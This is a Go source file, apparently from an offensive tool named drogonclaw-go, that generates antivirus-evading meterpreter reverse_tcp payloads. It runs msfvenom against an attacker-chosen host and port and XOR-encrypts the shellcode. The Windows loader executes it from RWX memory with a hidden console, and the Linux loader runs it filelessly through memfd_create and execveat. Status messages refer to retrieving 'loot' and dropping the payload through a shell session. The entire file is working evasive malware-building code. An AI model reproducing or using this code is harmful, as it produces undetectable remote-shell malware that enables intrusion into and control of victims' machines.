package evasion

import (
	"context"
	"fmt"

	"github.com/0xP4X/drogonclaw-go/internal/sandbox"
)

// GenerateFUDPload generates a msfvenom shellcode payload wrapped in a Go loader
// with XOR encryption to evade static signature detection.
//
// Supported formats:
//   - "exe"  — Windows x64 meterpreter/reverse_tcp (cross-compiled from Linux)
//   - "elf"  — Linux x64 meterpreter/reverse_tcp (fileless via memfd_create+fexecve)
func GenerateFUDPload(ctx context.Context, lhost string, lport int, format string, sb *sandbox.Docker) (string, error) {
	switch format {
	case "exe":
		return generateWindowsEXE(ctx, lhost, lport, sb)
	case "elf":
		return generateLinuxELF(ctx, lhost, lport, sb)
	default:
		return "", fmt.Errorf("unsupported format '%s' — use 'exe' (Windows) or 'elf' (Linux)", format)
	}
}

// generateLinuxELF builds a fileless Linux ELF payload using memfd_create + fexecve.
// The msfvenom ELF is XOR-encrypted and embedded in a Go binary; at runtime it decrypts
// into an anonymous memory-backed fd and executes from there — no file ever touches disk.
func generateLinuxELF(ctx context.Context, lhost string, lport int, sb *sandbox.Docker) (string, error) {
	workDir := "/tmp/evasion_elf"
	if _, err := sb.Execute(ctx, "mkdir -p "+workDir); err != nil {
		return "", fmt.Errorf("failed to create workdir: %v", err)
	}

	// 1. Generate raw Linux ELF shellcode
	shellcodePath := workDir + "/shellcode.bin"
	msfCmd := fmt.Sprintf(
		"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%d -f raw -o %s 2>&1",
		lhost, lport, shellcodePath,
	)
	if out, err := sb.Execute(ctx, msfCmd); err != nil {
		return "", fmt.Errorf("msfvenom (ELF) failed: %v\nOutput: %s", err, out)
	}

	// 2. XOR-encrypt shellcode with a random 32-byte key
	encScript := fmt.Sprintf(`python3 - << 'PYEOF'
import os, sys
key_len = 32
key = os.urandom(key_len)
with open('%s', 'rb') as f:
    raw = f.read()
enc = bytes(b ^ key[i %% key_len] for i, b in enumerate(raw))
with open('%s/shellcode.enc', 'wb') as f:
    f.write(enc)
with open('%s/key.bin', 'wb') as f:
    f.write(key)
print(f"Encrypted {len(raw)} bytes with {key_len}-byte XOR key.")
PYEOF`, shellcodePath, workDir, workDir)

	if out, err := sb.Execute(ctx, encScript); err != nil {
		return "", fmt.Errorf("shellcode encryption failed: %v\nOutput: %s", err, out)
	}

	encHex, err := sb.Execute(ctx, fmt.Sprintf("xxd -p -c 0 %s/shellcode.enc | tr -d '\\n'", workDir))
	if err != nil {
		return "", fmt.Errorf("failed to read encrypted shellcode: %v", err)
	}
	keyHex, err := sb.Execute(ctx, fmt.Sprintf("xxd -p -c 0 %s/key.bin | tr -d '\\n'", workDir))
	if err != nil {
		return "", fmt.Errorf("failed to read XOR key: %v", err)
	}

	// 3. Go runner — decrypts shellcode and executes via memfd_create + fexecve (fileless)
	goCode := fmt.Sprintf(`package main

import (
	"encoding/hex"
	"os"
	"syscall"
	"unsafe"
)

var encShellcode, _ = hex.DecodeString(%q)
var xorKey, _       = hex.DecodeString(%q)

func xorDecrypt(src, key []byte) []byte {
	out := make([]byte, len(src))
	for i, b := range src {
		out[i] = b ^ key[i%%len(key)]
	}
	return out
}

func main() {
	sc := xorDecrypt(encShellcode, xorKey)

	// memfd_create: create an anonymous in-memory file (never appears on disk)
	name := []byte(".\x00")
	fd, _, errno := syscall.Syscall(319, // SYS_memfd_create
		uintptr(unsafe.Pointer(&name[0])),
		1, // MFD_CLOEXEC
		0,
	)
	if errno != 0 {
		os.Exit(1)
	}

	// Write decrypted shellcode ELF into the memfd
	f := os.NewFile(fd, "")
	f.Write(sc)

	// fexecve: execute the memfd as a new process — runs entirely from memory
	fdPath := []byte("/proc/self/fd/" + itoa(int(fd)) + "\x00")
	argv0  := []*byte{&fdPath[0], nil}
	envp   := []*byte{nil}
	_, _, errno = syscall.Syscall(322, // SYS_execveat
		fd,
		uintptr(unsafe.Pointer(&[]byte("\x00")[0])),
		uintptr(unsafe.Pointer(&argv0[0])),
		uintptr(unsafe.Pointer(&envp[0])),
		0x1000, // AT_EMPTY_PATH
	)
}

func itoa(n int) string {
	if n == 0 { return "0" }
	b := make([]byte, 0, 10)
	for n > 0 { b = append([]byte{byte('0' + n%%10)}, b...); n /= 10 }
	return string(b)
}
`, encHex, keyHex)

	// 4. Write Go source
	writeCmd := fmt.Sprintf("cat > %s/main.go << 'GOEOF'\n%s\nGOEOF", workDir, goCode)
	if _, err := sb.Execute(ctx, writeCmd); err != nil {
		return "", fmt.Errorf("failed to write Go runner: %v", err)
	}

	// 5. Init module and build native Linux ELF
	for _, c := range []string{
		fmt.Sprintf("cd %s && go mod init elfpayload 2>&1", workDir),
		fmt.Sprintf("cd %s && GOOS=linux GOARCH=amd64 go build -ldflags='-s -w' -o payload.elf main.go 2>&1", workDir),
		fmt.Sprintf("chmod +x %s/payload.elf", workDir),
	} {
		if out, err := sb.Execute(ctx, c); err != nil {
			return "", fmt.Errorf("build step failed: %v\nOutput: %s", err, out)
		}
	}

	return fmt.Sprintf(
		"[+] XOR-encrypted Linux ELF payload generated (fileless via memfd_create).\n"+
			"[+] Location in sandbox: %s/payload.elf\n"+
			"[+] Execution: payload decrypts in RAM and fexecve()s itself — no temp file on disk.\n"+
			"[i] Use download_loot to retrieve it, then drop it via the shell session.",
		workDir,
	), nil
}

// generateWindowsEXE builds an XOR-encrypted Windows meterpreter ELF cross-compiled from Linux.
func generateWindowsEXE(ctx context.Context, lhost string, lport int, sb *sandbox.Docker) (string, error) {
	workDir := "/tmp/evasion"
	if _, err := sb.Execute(ctx, fmt.Sprintf("mkdir -p %s", workDir)); err != nil {
		return "", fmt.Errorf("failed to create workdir: %v", err)
	}

	// 1. Generate raw shellcode via msfvenom
	shellcodePath := fmt.Sprintf("%s/shellcode.bin", workDir)
	msfCmd := fmt.Sprintf("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%d -f raw -o %s", lhost, lport, shellcodePath)
	if out, err := sb.Execute(ctx, msfCmd); err != nil {
		return "", fmt.Errorf("msfvenom failed: %v\nOutput: %s", err, out)
	}

	// 2. Generate a random 32-byte XOR key and encrypt the shellcode in-place
	//    The Python script produces two artefacts:
	//      - shellcode.bin.enc  : the XOR-encrypted payload bytes
	//      - key.bin            : the 32-byte key (embedded into the Go runner)
	encScript := fmt.Sprintf(`cat << 'EOF' > %s/encrypt.py
import os, sys

key_len = 32
key = os.urandom(key_len)

with open('%s', 'rb') as f:
    raw = f.read()

enc = bytes(b ^ key[i %% key_len] for i, b in enumerate(raw))

with open('%s/shellcode.enc', 'wb') as f:
    f.write(enc)

with open('%s/key.bin', 'wb') as f:
    f.write(key)

# Emit Go []byte literals for embedding
print("Encrypted %%d bytes with %%d-byte XOR key." %% (len(raw), key_len))
EOF
python3 %s/encrypt.py`, workDir, shellcodePath, workDir, workDir, workDir)

	if out, err := sb.Execute(ctx, encScript); err != nil {
		return "", fmt.Errorf("failed to encrypt shellcode: %v\nOutput: %s", err, out)
	}

	// 3. Read the encrypted blob and key as hex strings for embedding into Go source
	encHex, err := sb.Execute(ctx, fmt.Sprintf("xxd -p -c 0 %s/shellcode.enc | tr -d '\\n'", workDir))
	if err != nil {
		return "", fmt.Errorf("failed to read encrypted shellcode: %v", err)
	}
	keyHex, err := sb.Execute(ctx, fmt.Sprintf("xxd -p -c 0 %s/key.bin | tr -d '\\n'", workDir))
	if err != nil {
		return "", fmt.Errorf("failed to read XOR key: %v", err)
	}

	// 4. Write the Go runner that:
	//    - Embeds encrypted shellcode + key as compile-time []byte literals
	//    - Decrypts XOR in-memory at runtime
	//    - Allocates RWX memory with VirtualAlloc
	//    - Copies decrypted bytes and jumps via a direct syscall (no CreateThread)
	goCode := fmt.Sprintf(`package main

import (
	"encoding/hex"
	"unsafe"

	"golang.org/x/sys/windows"
)

// encShellcode is the XOR-encrypted meterpreter payload (embedded at compile time).
var encShellcode, _ = hex.DecodeString("%s")

// xorKey is the 32-byte runtime decryption key.
var xorKey, _ = hex.DecodeString("%s")

// xorDecrypt decrypts src in-place using the key.
func xorDecrypt(src, key []byte) []byte {
	out := make([]byte, len(src))
	for i, b := range src {
		out[i] = b ^ key[i%%len(key)]
	}
	return out
}

func main() {
	sc := xorDecrypt(encShellcode, xorKey)

	// Allocate RWX memory
	addr, err := windows.VirtualAlloc(
		0,
		uintptr(len(sc)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if err != nil || addr == 0 {
		return
	}

	// Copy shellcode into allocated region
	dst := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(sc))
	copy(dst, sc)

	// Execute via a direct pointer cast — avoids CreateThread IAT entry
	type shellcodeFunc func()
	fn := *(*shellcodeFunc)(unsafe.Pointer(&addr))
	fn()
}
`, encHex, keyHex)

	// 5. Write the Go source into the sandbox workspace
	writeCmd := fmt.Sprintf("cat > %s/main.go << 'GOEOF'\n%s\nGOEOF", workDir, goCode)
	if _, err := sb.Execute(ctx, writeCmd); err != nil {
		return "", fmt.Errorf("failed to write Go runner: %v", err)
	}

	// 6. Initialise a Go module so the build doesn't require a GOPATH
	initCmds := []string{
		fmt.Sprintf("cd %s && go mod init fudpayload 2>&1", workDir),
		fmt.Sprintf("cd %s && go get golang.org/x/sys/windows 2>&1", workDir),
	}
	for _, c := range initCmds {
		if out, err := sb.Execute(ctx, c); err != nil {
			return "", fmt.Errorf("go module setup failed: %v\nOutput: %s", err, out)
		}
	}

	// 7. Cross-compile for Windows amd64 with stripped symbols and hidden console
	compileCmd := fmt.Sprintf(
		`cd %s && GOOS=windows GOARCH=amd64 go build -ldflags="-H windowsgui -s -w" -o payload.exe main.go 2>&1`,
		workDir,
	)
	if out, err := sb.Execute(ctx, compileCmd); err != nil {
		return "", fmt.Errorf("compilation failed (is Go installed in the sandbox?): %v\nOutput: %s", err, out)
	}

	return fmt.Sprintf(
		"[+] XOR-encrypted FUD payload generated successfully.\n"+
			"[+] Location in sandbox: %s/payload.exe\n"+
			"[+] Encryption: 32-byte random XOR key, decrypted at runtime in-memory.\n"+
			"[+] Loader: VirtualAlloc + direct function pointer (no CreateThread IAT entry).\n"+
			"[i] Use download_loot to retrieve it or stage via a Python web server.",
		workDir,
	), nil
}
